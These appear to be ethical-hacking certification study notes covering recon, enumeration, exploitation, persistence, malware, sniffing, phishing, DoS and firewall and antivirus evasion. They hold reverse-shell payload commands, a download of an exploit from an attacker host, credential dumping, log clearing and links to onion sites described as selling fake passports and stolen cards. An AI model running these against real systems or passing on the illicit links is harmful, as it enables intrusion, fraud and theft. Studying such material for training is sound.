fork de [@Creanyx0](https://github.com/Creanyx0/CEHv12-practical-Notes)


# Module 02: Footprinting and Reconnaissance

## Google Hacking Database - DORKs

> Dorks

filetype, site, intitle, inurl, cache, allinurl, allintitle, link, info, related, location...

Examples of queries:
- `EC-Council filetype:pdf`
- `intitle:login site:eccouncil.org`

More examples in: [ExploitDB](https://www.exploit-db.com/google-hacking-database])


## YouTube Metadata and Reverse Image Search

> Metadata in YouTube video
- https://mattw.io/youtube-metadata/
- https://citizenevidence.amnestyusa.org/

> Reverse Image Search
- https://citizenevidence.amnestyusa.org/
- https://tineye.com/
- Google Images: https://images.google.com/

> Play video in reverse
- https://www.videoreverser.com/es.html


## Gather Information from FTP Search Engines

File Transfer Protocol (FTP) search engines are used to search for files located on the FTP servers. These files may hold valuable information about the target.

* https://www.searchftps.net/
* https://www.freewareweb.com/


## Information Gathering from IoT Search Engines

IoT search engines crawl the Internet for IoT devices that are publicly accessible. They provide information such as hostname, open ports, location, IP, and more.

* [Shodan](https://www.shodan.io/)
* [Censys](https://search.censys.io/)


## Locate Network Range

https://www.arin.net/about/welcome/region/
* Type the IP target.


## Discovering Hosts in the Network

### nmap
```bash
nmap -PE -PM -PP -sn -n 192.168.0.0/24
```

### Fping
```bash
fping -g 192.168.0.0/24
```

### Masscan
```bash
# Discover top 20 ports
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
# Discober http services
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```

### Netdiscover
```bash
sudo netdiscover -i <interface> -r range
sudo netdiscover -i <interface> -p
```

### Metasploit
```bash
msf > use auxiliary/scanner/smb/smb_version
set rhosts 10.10.1.5-23
```

### hping3
```bash
hping3 -1 targetIP -p port -c packetCount
``` 

### arp
```bash
arp -a
```

## Find Domains and Subdomains
### Netcraft
- [Netcraft-report](https://sitereport.netcraft.com/)
- [Netcraft-DNS](https://searchdns.netcraft.com/)

### crt.sh
- https://crt.sh/

### SecurityTrails
- https://securitytrails.com/

### gobuster
```bash
gobuster dns -d mysite.com -t 50 -w common-names.txt

gobuster dir -u https://mysite.com/path/to/folder -c 'session=123456' -t 50 -w common-files.txt -x .php,.html

gobuster fuzz -u https://example.com?FUZZ=test -w parameter-names.txt

```

### Sublist3r
```bash
python sublist3r.py -d example.com
```

### DNSEnum
```bash
dnsenum --dnsserver IP --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt domain.com
```

### Zone Transfer
```bash
# Identifying Nameservers
nslookup -type=NS zonetransfer.me

# Try zone transfer
dig axfr @IP domain.com
```


## Gather Personal Information

- [Peekyou](ttps://www.peekyou.com/): Search by username or name and location.
- [Intelius](https://www.intelius.com/)
- [Spokeo](https://www.spokeo.com/)


## Gather Personal Information from Social Networks

###  Username search engines:
- https://namechk.com/
- https://www.namecheckr.com/

### Social Searcher - Search by number, name, etc.
- [Social Searcher](https://www.social-searcher.com/)

### Social Networks - search by username
- [UserRecon](https://github.com/wishihab/userrecon) `./userrecon.sh`
- [Sherlock](https://github.com/sherlock-project/sherlock) `python3 sherlock --help`

### Analyze followers and contacts: 
- https://followerwonk.com/analyze.html
- https://www.social-listening.mx/blog/sysomos-herramienta-escucha-social/


## Gather Email List


- [theHarvester](https://github.com/laramies/theHarvester)
```bash
theHarvester -d domain.com -l numberResults -b dataSource
```

- [Hunter.io](https://hunter.io/)

- Maltego



## Deep and Dark Web Searching

*  Tor Browser
* Search engine: [DuckDuckGo](https://duckduckgo.com/)
* [TheHiddenWiki](https://thehiddenwiki.org/)
* [ExoneraTor – Tor Metrics (torproject.org)](https://metrics.torproject.org/exonerator.html)
* **The Hidden Wiki** is an onion site that works as a Wikipedia service of hidden websites. (http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion/wiki)
* **FakeID** is an onion site for creating fake passports (http://ymvhtqya23wqpez63gyc3ke4svju3mqsby2awnhd3bk2e65izt7baqad.onion)
* **Cardshop** is an onion site that sells cards with good balances (http://s57divisqlcjtsyutxjz2ww77vlbwpxgodtijcsrgsuts4js5hnxkhqd.onion)
* https://onionengine.com/


## Determine Target OS Through Passive Footprinting

* Censys (https://search.censys.io/hosts/-ip-)
* Netcraft
* Shodan


## Gather Information about a Target

* Ping
* nmap
* https://centralops.net/co/: Domains, IP, DNS, traceroute, nslookup, whois, and more.
* https://website.informer.com/
* [GRecon](https://github.com/TebbaaX/GRecon): Directory listing, subdomains, login pages, exposed documents, and more.
```bash
python3 grecon.py
- Set target: domain
```

* Photon: URLs, email, social media accounts, files, subdomains, and more.
```bash
python3 photon.py -u http://www.domain.com
```

* https://dnsdumpster.com/
* https://github.com/s0md3v/ReconDog
* https://github.com/Moham3dRiahi/Th3inspector


## Gather a Wordlist from the Target Website

[CeWL](https://github.com/digininja/CeWL)
```bash
cewl -w outputFile -d depthSpiderWebsite -m minWordLength domain.com
```


## Extract Company's Data

Emails, Phones, URLs, files, and more.

- Web Data Extractor (wde.exe)
    - New > Type the URL > Check all the options > OK > Start

- FOCA

- ParseHub (web scraper)

- SpiderFoot


## Mirror a Target Website

- wget
```bash
wget -mk -nH misite.local
```

- [goclone](https://github.com/imthaghost/goclone)
```bash
goclone <url>
```


- HTTrack (winhttrack.exe)
* OK > Next > Create a new project > Type the web addresses > Set options > Scan Rules tab > Check all file types > OK > Next > Finish to start mirroring the website > Browse Mirrored Website

- Cyotek WebCopy


## Email Analyzer (location, routing, headers, IP, and more)

- eMailTrackerPro (emt.exe)

My trace reports > Trace headers > Trace an email I have received > Copy the header from suspicious email and paste it in the email headers field > Trace
* In Gmail: Click the email and select show original
* In Outlook: Double-click the email > click more actions > view message source

- [infoga](https://github.com/GiJ03/Infoga)
```bash
python infoga.py –target domain –sourceall
```

> Mailtrack.io


## FQDN - DNS footprinting

- nmap
```bash
nmap -p 53,88,389,445 -sS -sV -O --script="dns-service-discovery" --resolve-all target-ip-range
```

- dig
```bash
dig @9.9.9.9 atendata.xyz +short
dig @9.9.9.9 atendata.xyz +short txt
dig @9.9.9.9 atendata.xyz +short mx
[...]
```

- nsklookup
```bash
nslookup <ip>
nslookup <domain>
nslookup set type=cname <domain>
nslookup set type=a <domain>
```

- nuclei
```bash
nuclei -list hosts.txt
nuclei -target domain
nuclei -target IP
nuclei -stats -target <url> -no-mhe -rl 50
```

- dnsrecon
```bash
/dnsrecon.py -r iprange
```

## Whois Lookup - Online Tool

Gather information about a target (domain or IP): IP location, IP address, Hosting Info, and more.
* https://whois.domaintools.com/

```bash
whois google.com
whois 8.8.8.8
```


## DNS footprinting - Nslookup

Gather DNS information: 
- nslookup

Online tools:
- http://www.kloth.net/services/nslookup.php
- https://mxtoolbox.com/DNSLookup.aspx
- https://dnsdumpster.com/
- https://mxtoolbox.com/NetworkTools.aspx


## Reverse DNS Lookup

Is used for finding the IP addresses for a given domain name, and the reverse DNS operation is performed to obtain the domain name of a given IP address.
- https://www.yougetsignal.com/
	- Reverse IP domain check > Type the remote address > check
- [DNSRecon](https://github.com/darkoperator/dnsrecon)
```bash
./dnsrecon.py -r IPrange
./dnsrecon.py -r 162.241.216.0-162.241.216.255
```
- https://dnschecker.org/
- https://dnsdumpster.com/


## Network Tracerouting

The route is the path that the network packet traverses between the source and destination.

- tracert (Windows)
```bash
cmd> tracert domain
cmd> tracert -h maxhops domain
```

- traceroute (Linux)
```bash
mtr ip/domain -n
traceroute domain
```

> Path Analyzer Pro (PAPro27.msi)
* Protocol ICMP > Length of packets Smart > Stop on control messages ICMP > Type the Target > Smart > Trace > Type time of trace > Acept > Trace


##  Footprinting a Target

> Recon-ng (Linux)
```bash
recon-ng
marketplace install all
modules search
workspaces create nameWorkspace
db insert domains
show domains
modules load moduleSelected
run
info command
options set NAME data
```

> OSRFramework tools
* https://github.com/i3visio/usufy: Gather registered accounts with given usernames.
* https://github.com/i3visio/osrframework/blob/master/osrframework/phonefy.py: Checks for the existence of a given series of phones.
* https://github.com/i3visio/osrframework/blob/master/osrframework/mailfy.py: Gathers information about  emails accounts.
* https://github.com/i3visio/osrframework/blob/master/osrframework/domainfy.py
	`domainfy -n domain -t all`
* https://osintframework.com/

> Billchiper
* https://github.com/bahatiphill/BillCipher: whois, DNS, port scanner, zone transfer, etc.
	- `python3 billchipher.py`

----

# Module 03: Scanning Networks
## Host, Ports, Service and Vulnerabilities Discovery

- Zenmap: GUI for the Nmap Security Scanner
- nmap
```bash
nmap -sV -sC IP
nmap --script=name IP
```

- sx Tool (Linux): Port scanning
```bash
sx arp IP/24
sx tcp -p 1-65535 IP
cat arp.cache | sx udp -p PORT IP
```

-  Metasploit
```bash
service postgresql start
msfdb init
msfconsole
db_status
nmap -Pn -sS -A -oX Test IP/24
db_import Test
hosts
services
auxiliary/scanner/portscan/syn
```

- megaping.exe (Windows): Port and service discovery
    * IP Scanner Tab > Enter the IP range > Start
    * Port Scanner Tab > Enter the IP address in the destination list > Add > Start

- NetScanTools pro (nstp.exe - Windows): Port and service discovery
    * Ping Scanner > Use default system DNS > Enter the range of IP addresses > Start
    * Port Scanner > Target hostname or IP address > Select the TCP full connect radio button > Scan range of ports button


##  Domain info

- Domain User Account: enum4linux

Enum4linux is an open-source tool used for enumerating information from Windows and Samba systems.
```bash
enum4linux -a IP`
enum4linux -U -v IP
enum4linux -u user -p password -U IP
```

##  Sniffer
- WireShark
- tcpdump
```bash
tcpdump -i eth0 -n port 80 and host 192.168.1.1
```

##  OS Discovery

- ping 
* TTL (64 Linux and 128 Windows)

- nmap 
```bash
nmap -A IP
nmap -O IP
nmap -p 445 --script smb-* <IP>
```

- unicornscan
    - `unicornscan IP -Iv`


##  Evasion Techniques (IDS, firewalls and more)

- nmap 
- -f: fragment packets.
- -g or --source-port: manipulate the source port.
- -mtu: to change packet sizes.
- -D -RND: generate random IPs.
- --spoof-mac 0: randomizing the MAC address.

- Colasoft: custom packet builder.
 
- hping3
```bash
hping3 IP --udp --rand-source --data NUM
```

- Browse Anonymously using Proxy Switcher
    * Proxy Switcher (proxyswitcherstandard.exe - Windows)
    * CyberGhost VPN


##  Create Network Diagram

- Solarwinds (Windows)
- Netminer (Windows)



-----

# Module 04: Enumeration

##  NetBIOS Enumeration

List of computers belonging to a target domain, network shares, policies, etc.
NetBIOS is a local network communication protocol. `nbtstat` is a tool used to query NetBIOS information on Windows. The hostname is different from NetBIOS. A device can have multiple NetBIOS names for various network roles.

- nmap
```bash
nmap -sV --script nbstat.nse IP
nmap -sU -p 137 --script nbstat.nse IP
```

- nbtstat (Windows)
```bash
nbtstat -a IP
nbtstat -a hostname
nbtstat -c
```

- windows
```bash
cmd> net use
```

- NetBIOS Enumerator (Windows)


##  SNMP Enumeration

```bash
snmp-check IP
snmpwalk -v1 -c public IP
snmpwalk -v2c -c public IP
snmpwalk -v3 -c public IP

nmap -sU -p 161 IP --script=snmp-processes --script=snmp-win32-software --script=snmp-interfaces
```

> SoftPerfect Network Scanner (Windows)
* Options menu > Remote SNMP > Click on button Mark all the items available > Enter the IP range > Start scanning
* Pulse an individual IP > Properties
The scanned hosts that have a node are the shared folders. Expand the node to view it. Click open device.


## LDAP Enumeration

- ADExplorer.exe
    - Type the target IP in the 'Connect to' text field > OK

- nmap
```bash
nmap -sU -p 389 IP
nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=CEH,dc=com"' IP
```

- python3
```bash
python3
import ldap3
server=ldap3.Server('IP',get_info=ldap3.ALL,port=389)
connection=ldap3.Connection(server)
connection.bind()
server.info
connection.entries
```

- ldapsearch
```bash
ldapsearch -h IP -x -b "DC=domain,DC=com"
ldapsearch -h IP -x -s base namingcontexts
```


- netexec
```bash
netexec [proto] --help
netexec ldap <ip> -u username -p password --users
netexec ldap <ip> -u user_files -p password-files 
```


##  NFS Enumeration
```bash
sudo nmap IP -p111,2049 -sV -sC
sudo nmap --script nfs* IP -sV -p111,2049

showmount -e IP

# Mounting NFS share
mkdir directory
sudo mount -t nfs IP:/ ./directory/ -o nolock
xample: `sudo mount -t nfs IP:/home /tmp/nfs
cd directory
tree .

# SuperEnum 
echo "IP" >> Target.txt
./SuperEnum
Target.txt

# RPCScan
python3 rpc-scan.py IP -rpc
```


##  DNS Enumeration
- Zone Transfer
```bash
dig ns domain
dig @nameserver targetDomain axfr


nslookup
set querytype=soa
domain
ls -d nameServer
```

- DNSRecon
```bash
./dnsrecon.py -d domain -z
```

- Nmap
```bash
--script=droadcast-dns-service-discovery
--script dns-brute
--script dns-srv-enum "dns-srv-enum-domain='domain'"
```


##  SMTP Enumeration

```bash
nmap -p 25 --script=smtp-enum-users IP
--script=smtp-enum-users
--script=smtp-open-relay
--script=smtp-commands
```


##  RPC and SMB Enumeration

> NetScanToolsPro (Windows) 
* Manual Tools > SMB Scanner > Start SMB scanner > Edit target list > Add the IP target to the list > OK > Edit share login credentials > Type credentials > Add to list > OK > Get SMB versions
* Click one IP > View shares
* Manual Tools > * nix RPC Info > Enter the IP target into target field > Dump portmap

- SMB
```bash
nmap -sU -sS --script=smb-enum-users IP
netexec smb IP -u userList -p 'password'
netexec smb IP --shares -u '' -p ''
netexec smb IP -u user -p 'pass' --sam
netexec smb IP -u user -H hash
nbtscan -r range
enum4linux -U -o -d IP
nmblookup -A IP
tpcclient -U "" -N IP
rpcclient -U username IP
rpcclient -U username%password IP
	srvinfo
	enumdomains
	netshareenumall
	enumdomusers
	queryuser 0x3e9
```

- [msf] > `use auxiliary/scanner/smb/smb_login`
- List the shared resources of an SMB server:
```bash
smbclient -L \\IP
smbclient -L \\\\\\\\IP`
smbclient -L \\\\\\\\IP -U username
```
- Access to the shared resources of an SMB server:
```bash
smbclient \\\\\\\\IP\\directory
smbclient \\\\\\\\IP\\directory -U username
smbclient \\\\IP\\directory -U user%password123
```
- Interesting commands:
	`get file`
	`mget *`
	`put file`


##  RDP (Remote Desktop Protocol) - ms-wbt-server

- nmap
```bash
nmap -sV -sC IP -p3389 --script rdp*
```

- Connect with credentials
```bash
rdesktop -u username IP
rdesktop -d domain -u username -p password IP
xfreerdp [/d:domain] /u:username /p:password /v:IP
rdesktop IP
reg add HKLM\System\CurrentControlSet\Control\Lsa /tREG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
```

```bash
evil-winrm -i IP -u username -p password
```

> Connect with the hash (pass the hash)
```bash
xfreerdp [/d:domain] /u:username /pth:hash /v:IP
```


## Enumerate Windows and Samba Hosts

- enum4linux
```bash
enum4linux -u user -p pass -n IP
enum4linux -o IP
enum4linux -a IP
- Get userlist: `enum4linux -U IP`
- Get password policy: `enum4linux -P IP`
- Get group and member list: `enum4linux -G IP`
- Get sharelits:  `enum4linux -S IP`
```

##  FTP Enumeration

```bash
nmap -p 21 --script ftp-* <ip>
```

```bash
ftp user@IP
ftp IP
wget -m --no-passive ftp://anonymous:anonymous@ip:port
wget -m --no-passive ftp://user:password@IP:port
```

- Cracking credentials
```bash
hydra -L wordlistsUsers -P wordlistsPass ftp://IP
```


##  SSH

- User enumeration
```bash
msf> `use scanner/ssh/ssh_enumusers`
```

- Connect
```bash
ssh userName@IP -p port
```
- Cracking credentials
```bash
hydra -L wordlistsUsers -P wordlistsPass ssh://IP
```

##  Enumerate information

- Global Network Inventory (Windows)
    - Single Address scan > Type the IP target > Type credentials

##   Enumerate Network Resources

- Advanced IP Scanner (Windows)
    - Type the IP adress range (Example: 10.10.1.5-10.10.1.23) > Scan button


----

# Module 05: Vulnerability Analysis

##   Vulnerability Analysis

-  OpenVAS
    - start Greenbone
    - https://127.0.0.1:9392
    - admin:password
    - Scans > tasks > task wizard > Type the IP target or hostname > Start scan

- Nessus
    - https://localhost:8834
    - admin:password

- GFI LandGuard (Windows)
    - Scan > Type the IP target > Full scan > Scan


##   Vulnerability Scanning Web Servers

- Nuclei
```bash
 nuclei -u https://IP
```

-  Nikto
```bash
nikto -h domain
```

##   RCE

- View a file
    - Example: `8.8.8.8&&type C:\\path`

- Find users
    - Example: `8.8.8.8 | net user`

- Add a user
    * Example: net localgroup Administrators Test /add
    * connect with RDP -> IP and user Test

-----

# Module 06: System Hacking

## Active Online Attack to Crack the System's Password

-  Responder
```bash
sudo ./Responder.py -I interface
```

- John The Ripper: Crack the hash
```bash
john hashes.txt
john --wordlist=/usr/--- hashes
john hashes --show
john --format=hash_type --wordlist=/usr/[...] hashes
john --format=Raw-MD5 --wordlist=/usr/[...] hashes #example with md5
```

- Hash identifier:
```bash
hash-identifier hash
```

- Hashcat
```bash
hashcat -m 0 -a 0 pathFileContainsHash pathWordlist
    - -m: type hash we are cracking (for example 0 = MD5).
	- -a 0: designates a dictionary attack.
```

- [Crackstation](https://crackstation.net)

- l0phtcrack (Windows) Audit system passwords
    - Click Password auditing wizard > Next > Choose the target system type (Windows or Linux) > A remote machine > Type the IP target and credentials > Choose audit type


##   Create a Reverse Shell

- Msfvenom (reverse shell)
```bash
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=IP LPORT=port -o ./test.exe

msfvenom -p windows/meterpreter/reverse_tcp lhost=IP lport=port -f exe > /home/attacker/Desktop/backdoor.exe
```

- Init a server with apache2 (/var/www/html)
```bash
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chmod -R www-data:www-data /var/www/html/share
cp /test.exe /var/www/html/share
service apache2 start
# or
python3 -m http.server port
```

- Init a handler
```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST IP
set LPORT port
exploit
```

- Upload a powerup (powersploit)
```bash
meterpreter > upload /root/PowerSploit/PowerUp.ps1
meterpreter > shell

powershell -ExecutionPolicy Bypass -Command ". .\\PowerUp.ps1;Invoke-AllChecks"
```

##   Gain Access to a Remote System

-  Armitage (Linux)
    - `service postgresql start`
    - `armitage`

- Ninja Jonin

- Fatrat (crear reverse)


##   Escalate Privileges
- gtfobins: is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. (https://gtfobins.github.io/)[https://gtfobins.github.io/]


- sudo
```bash
sudo -i
```

- find scret files
```bash
find /myfoder -name "secret.txt" -o -name "*.png"
find /myfolder -type {f/d} -name myfile.txt
```

- getsystem
```bash
    meterpreter> sysinfo
    meterpreter> getsystem -t 1
```

- hashdump
```bash
    meterpreter > `run post/windows/gather/smart_hashdump
```

- bypassuac
```bash
meterpreter > background
[msf]> use /windows/local/bypassuac_foghelper
getuid
```

- SUID
```bash
find / -perm -4000 -ls 2> /dev/null
```

- Mimikatz
```bash
load kiwi
lsa_dump_secrets
lsa_dump_sam
password_change -u user -n hashNTLM -P password
```

- BeRoot
```bash
meterpreter> upload /home/attacker/Desktop/BeRoot/beRoot.exe
meterpreter> shell
 beRoot.exe
 exit
meterpreter> upload /home/attacker/Desktop/Seatbelt.exe
meterpreter> shell
    Seatbelt.exe -group=system
```

- Search files
```bash
    meterpreter> search -f file
    
    find /myfoder -name "secret.txt" -o -name "*.png"
    find /myfolder -type {f/d} -name myfile.txt
```

- Show state firewall
```bash
netsh firewall show state
```

##   Polkit or Policykit
- pkexec cve-2021-4034


##   Modified Data

-  MACE value
```bash
timestomp secret.txt -m "01/01/2020 8:09:29"
timestomp secret.txt -v
```

##   Keylogger
- keyscan
```bash
    meterpreter > keyscan_start
    meterpreter > keyscan_dump
```


##   System Monitoring
* Remote Desktop Connection (RDP)
* Power Spy (Windows)
* Log view
* SpyAgent

##   Hide Files
>  Hidden a exe onto a txt
```bash
type c:\\calc.exe > c:\\readme.txt:calc.exe
mklink backdoor.exe readme.txt:calc.exe
```


##   Hide Data - Steganography

- Snow
# Hide data
```bash
snow.exe -C -m "text" -p "password" text1.txt text2.txt
	- 'password' is the password. The data text is hidden inside the text2.txt
	- the file text2.txt has become a combination of text1.txt and text
```
 
# Extract data on files
- snow: Steganographic Nature Of Whitespace (SNOW) 
```bash
snow.exe -C -p "password" text2.txt
	- It shows the context of text1.txt
```

- stegsnow: Whitespace steganography program
```bash
stegsnow -p password -C restricted.txt output.txt
```

# Extract data from image file
- Upload file to [CRC Online Tool](https://emn178.github.io/online-tools/crc/) and extract data


- Covert_tcp (bypass firewalls and send data)
```bash
machine 1:
	copy covert_tcp.c file
	mkdir send
	cd send
	paste covert_tcp.c file
	echo "secret message" > message.txt
	cc -o covert_tcp covert_tcp.c
machine 2:
	mkdir receive
	cd receive
	copy covert_tcp.c file
	cc -o covert_tcp covert_tcp.c
	./covert_tcp -dest IP -source IP -source_port port -dest_port port -server -file /home/Desktop/Receive/receive.txt
machine 1:
	./covert_tcp -dest IP -source IP -source_port port -dest_port port -server -file /home/Desktop/Send/message.txt
```


##   Image Steganography
- Steghide
```bash
# Reveals if a file contains hidden data.
steghide info file 

# Extracts the hidden data in [image] files, password optional.
steghide extract -sf file [--passphrase password] 

# Attempt password cracking on Steghide 
stegcracker <file> [<wordlist>]
```

- Openstego.exe (windows)
Hide or extract data from a file.

    * Hide data (Example: txt into a jpg)
    Type the message or select the file (txt) > Select the file (jpg) > choose the output location to the stego file > Hide data

    * Extract data (Example: txt from bmp or jpg)
    Select the input stego file > Select the output folder > Enter the password > Extract data

- [StegOnline (georgeom.net)](https://stegonline.georgeom.net/upload)

    - Hide data:
        Upload the file > Embebed files/data > Check the checkboxes under row 5 > Text option > Enter the text > Go > Download extracted data

    - Extract data:
        Extract files/data >  Check the checkboxes under row 5 > Go 


##   Maintain Persistence

>  Upload a reverse in the system
- `msfvenom -p windows/meterpreter/reverse_tcp lhost=ip lport=port -f exe > payload.exe`
- meterpreter> `upload /home/attacker/payload.exe`
- and create a new multi/handler

> PowerView and add a user, set a privileges and a group
- meterpreter> `upload -r /home/attacker/PowerTools-master C:\\\\Users\\\\Administrator\\\\Downloads`
- meterpreter> `shell` 
- `powershell`
- `cd C:\\\\Users\\\\Administrator\\\\Downloads\\\\PowerView`
- PS> `Add-ObjectAcl -TargetADSprefix 'CN=ADminSDHolder,CN=System' -PrincipalSamAccountName user -Verbose -Rights All`
- PS> `Get-ObjectAcl -SamAccountName "user" -ResolveGUIDs`
- PS> `REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /V AdminSDProtectFrecuency /T REG_DWORD /F /D 300`
- PS> `net group "Domain Admins" user /add /domain`


##   Clear logs to hide the evidence of compromise

```bash
# View policies and check wheter the audit policies are enabled
cmd> `auditpol /get /category:*`

# Enable the audit policies
cmd> auditpol /set /category:"system","account logon" /success:enable /failure:enable

# Clear audit policies
cmd> auditpol /clear /y

# Display a list of events logs:
cmd> el | enum-logs
cmd> wevtutil el

# Clear a log:
cmd> wevtutil cl system

# Clear Linux Machine Logs
history -c
history -w
shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit

# Hidding artifacts
cmd> mkdir test
cmd> attrib +h +s +r test
    
# To view it:
cmd> attrib -h -s -r test

# Hide a user
cmd> net user test /active:no
cmd> net user test /active:yes
```




----

# Module 07: Malware Threats


##   Gain Control over a Victim Machine

-  njRAT Trojan (Remote Access Trojans) -> Windows
    * builder
    * Create trojan with reverse shell and send it to the victim machine and execute it
    * When a session is opened, click on it and pulse in "manager" option or "remote desktop", "remote cam", and more.


##   Hide a Trojan and make it undetectable

- https://github.com/Samsar4/Ethical-Hacking-Labs/blob/master/6-Malware/3-Obfuscating-Trojan-SwayzCryptor.md
- SwayzCryptor.exe

##   Create a Malware

- ProRat.exe
- Theef RAT Trojan: server210.exe y client210.exe
- JPS Virus Maker Tool (jps.exe)


##   Static Analysis
* https://www.hybrid-analysis.com/
* VirusTotal
* https://valkyrie.comodo.com/


##   Strings Search
- BinText.exe


##   Identify Packaging and Obfuscation Methods

- PEiD.exe


##   Analyze ELF Executable File (for example malware executable file)
- Detect It Easy (die.exe)

nota: Sometimes if file is type ELF is so useful to switch to "ELF TAB"

##   Information of a Malware Executable File

- PE Explorer.exe


##   Identify File Dependencies

-  Dependency Walker (depends.exe)


##   Malware Disassembly - Reversing

- IDA (idafree.exe)
```bash
New > Select file to disassemble > OK > View > Graphs > Flow chart or funtion calls
IDA view-A > Text view
Example: .text 0048458 start proc near -> Entry point 0x0048458
```

- OllyDbg.exe
```bash
File > Open > Select the file > View > Log
Log data also displays the program entry point
View > memory
```

- GHidra
- Radare2
- WinDgb
- ProcDump


##   Dynamic Malware Analysis

- TCPView.exe (sysinternals)
- CurrPorts (cports.exe)
- Process Monitor (procmon.exe)
- Reg-organizer (Windows)
- Registry Viewer
- Windows Service Manager (SrvMan.exe)
- autoruns.exe
- wpsetup.exe (WinPatrol): Application monitoring
- SetupInstallMonitor.exe (Mirekursoft)
- PA File Sight (filesightultra.exe): Files and folder monitoring
- DriverView and Driver reviver: Drivers monitoring
- DNSQuerySniffer.exe: DNS monitoring


----


# Module 08: Sniffing

##   MAC flooding

-  macof
```bash
macof -i interface -n numPackets -d IP
```


##   Spoof a MAC address

-  TMAC (Windows)
    - Click the Random MAC Address button under the Change MAC Adress to generate a random MAC

 
- SMAC (Windows)
    - Select the network adapter
    - Click the random button
    - Click the forward arrow button (>>) under network connection to view the network adapter information

- macchanger (Linux)
```bash
# Current MAC:
macchanger -s interface

# Generate new random MAC
macchanger -a interface

# Set a random MAC
macchanger -r inteface
```

## DHCP flooding (DoS)
-  Yersinia
```bash
yersinia -I
press h for help
press q to exit the help options
press F2 to select DHCP mode
press x to list available attack options
press 1 to start a DHCP starvation attack
```

## ARP Poisoning (MITM attack)
- arpspoof
```bash
arpspoof -i interface -t IP1 IP2
arpspoof -i interface -t IP2 IP1
IP1 is the address of the access point or gateway
IP2 is the target system
```

- Cain & Abel
```bash
Scan MAC adress
New ARP Poison Routing
It can be used to monitoring the traffic between two systems and detect this type of attacks
```

## Analyze a Network
-  Omnipeek Network Protocol Analyzer (Windows)
    - New capture and click on the adapter option.
    - Click on start capture.

- SteelCentral Packet Analyzer (Windows)

## Detect ARP Poisoning and Promiscuous Mode

- Cain & Abel
- nmap
	- --script=sniffer-detect
- Colasoft Capsa Network Analyzer (detect ARP poisoning and flooding)

-----

# Module 09: Social Engineering
## Sniff credentials
- SET (Social-Engineer Toolkit)
```bash
- setoolkit
- set the IP address of the local machine and the domain to clone
- social-engineering attacks
- website attack vectors
- credentials harvester attack method
- site cloner
- Send a custom email with a malicious link (redirect a malicious IP - http://IP-attacker) 
```


## Detect Phishing
- Netcraft Anti-phishing (Extension)
- PhishTank: https://phishtank.org/

## Audit Organization's Security for Phishing Attacks
- OhPhish: https://portal.ohphish.com/login

----
# Module 10: Denial of Service (DoS)
## DoS Attack (SYN Flooding)

- Metasploit
```bash
auxiliary/dos/tcp/synflood
```

- hping3
```bash
hping3 -S IP1 -a IP2 -p port --flood
```
- Raven-storm (Linux)
```bash
rst
l4
ip IP
port PORT
threads numberThreads
run
```

## DDoS Attack
- HOIC - High Orbit Ion Cannon (Windows)
```bash
- Click the + button
    * Type the target URL http://IP
- Select GenericBoost.hoic and click add
- Set the threads value to 20
- Do that on more machines and click on "fire teh lazer"
```

- LOIC - Low Orbit Ion Cannon (Windows)
```bash
Select the IP and click on lock on
Select UDP, the theads to 10 and the power bar to the middle
Do that on more machines and click on IMMA CHARGIN MAH LAZER
```

## PoD (Ping of Death)

- hping3
```bash
hping3 -d dataSize -S -p port --flood IPtarget
hping3 -2 -p port --flood IPtarget
    # -2 specifies the UDP mode
```

## Detect and Protect Against DDoS Attacks

- Guardian (Windows)
    - You can see detail view, packets sent and received from each IP and you can block any of them.
    - Launch Anti DDoS Guardian
    - In the bottom-right cornert of Desktop, click on show hidden icons
    - If there are huge number of packets coming from the same host machines, its a DDoS attack
    - You can double-click on any of the sessions and you can block it, clear, allow IP, and more

- Wireshark
    - Yellow, black or blue packets (SYN, TCP, UDP, ARP, ECN, CWR)
----

# Module 11: Session Hijacking

## Intercept HTTP Traffic
- mitm / mitmweb

-  Bettercap (sniffing, arp spoof, net recon and more)
```bash
bettercap -iface interface
net.probe on
net.recon on
set http.proxy.sslstrip true
set arp.spoof.internal true
set arp.spoof.targets IPtarget
http.proxy on
arp.spoof on
net.sniff on
set net.sniff.regexp expresion
('.* password=.+')
```

- Hetty (Windows) - MIMT attack
```bash
click on it
http://localhost:8080
create new project
Chrome > Settings > System > Manual proxy > ON > IP and port 8080
```

----

# Module 12: Evading IDS, Firewalls and Honeypots

## Detect Intrusions

-suricata (IDS)

-  Snort (IDS)
```bash
cmd -> snort
List machine's physical address, IP and Ethernet Drivers:
	* `snort -W` 
Configuration file:
    * snort.conf
Start snort:
	* `snort -iX -A console -c C:\\Snort\\etc\\snort.conf -l C:\\Snort\\log -k ascii`
	* Replace X with your device index number
```


## Detect Malicious Network Traffic
-  ZoneAlarm Free Firewall (zafw): Windows
    - You can block any domain, IP or whatever > Firewall > View zones > Firewall settings > Add zone

- HoneyBOT (Windows): Honeypot that creates a safe enviroment to capture and interact with unsolicited traffic on a network.


## Bypass Windows Firewall

-  Nmap evasion techniques
```bash
nmap -sP IP/range
nmap -sI IP1 IP2
```


## Bypass Firewall Rules

-  HTTP/FTP tunneling
    - If IIS Admin Service is running, stop the program.
    - Run htthost.exe
    - Revalidate DNS names and log connections.
    - Run httport3snrm.exe to perform tunneling using HTTPort

- BITSAdmin
```bash
msfvenom -p windows/shell_reverse_tcp lhost=IP lport=port -f exe > /exploit.exe
service apache2 start
PS> bitsadmin /transfer Exploit.exe http://IP/exploit.exe c:\\exploit.exe
```

## Bypass Antivirus

- Metasploit
```bash
pluma /usr/share/metasploit-framework/data/templates/src/pe/exe/template.c
change 4096 to 4000
cd /usr/share/metasploit-framework/data/templates/src/pe/exe i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe

